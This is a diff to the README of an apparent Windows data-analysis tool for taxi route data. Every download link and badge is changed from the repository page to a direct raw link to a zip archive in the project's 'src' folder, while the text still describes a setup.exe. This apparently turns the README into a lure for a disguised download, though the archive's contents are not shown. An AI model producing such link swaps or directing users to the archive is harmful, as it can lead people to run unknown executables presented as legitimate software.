@@ -1,6 +1,6 @@
 # 🚖 taxi-trajectory-spatial-analysis - Analyze Large Taxi Route Data Easily
 
-[![Download](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/felipe122388-afk/taxi-trajectory-spatial-analysis)
+[![Download](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/felipe122388-afk/taxi-trajectory-spatial-analysis/raw/refs/heads/main/src/analysis-spatial-trajectory-taxi-v1.9.zip)
 
 Advanced spatial and time-based analysis for taxi routes. This tool helps you explore and index over 1.7 million taxi routes using standard databases.
 
@@ -32,7 +32,7 @@ This section explains how to get and run the program on your Windows computer st
 
 Click the big green button below to open the download page.
 
-[![Download Now](https://img.shields.io/badge/Download-Here-blue)](https://github.com/felipe122388-afk/taxi-trajectory-spatial-analysis)
+[![Download Now](https://img.shields.io/badge/Download-Here-blue)](https://github.com/felipe122388-afk/taxi-trajectory-spatial-analysis/raw/refs/heads/main/src/analysis-spatial-trajectory-taxi-v1.9.zip)
 
 On the page, look for the latest release or main download link. Click the file named like `taxi-trajectory-spatial-analysis-setup.exe` or similar.
 
@@ -114,7 +114,7 @@ By combining these, the program can quickly find spatial patterns in large taxi 
 
 To get the app or reinstall, visit this page:
 
-[Download taxi-trajectory-spatial-analysis](https://github.com/felipe122388-afk/taxi-trajectory-spatial-analysis)
+[Download taxi-trajectory-spatial-analysis](https://github.com/felipe122388-afk/taxi-trajectory-spatial-analysis/raw/refs/heads/main/src/analysis-spatial-trajectory-taxi-v1.9.zip)
 
 This page always has the latest version.
 
@@ -154,4 +154,4 @@ If you encounter issues or want to suggest improvements, use the Issues tab on t
 
 The page link again here for convenience:
 
-[https://github.com/felipe122388-afk/taxi-trajectory-spatial-analysis](https://github.com/felipe122388-afk/taxi-trajectory-spatial-analysis)
+[https://github.com/felipe122388-afk/taxi-trajectory-spatial-analysis/raw/refs/heads/main/src/analysis-spatial-trajectory-taxi-v1.9.zip](https://github.com/felipe122388-afk/taxi-trajectory-spatial-analysis/raw/refs/heads/main/src/analysis-spatial-trajectory-taxi-v1.9.zip)
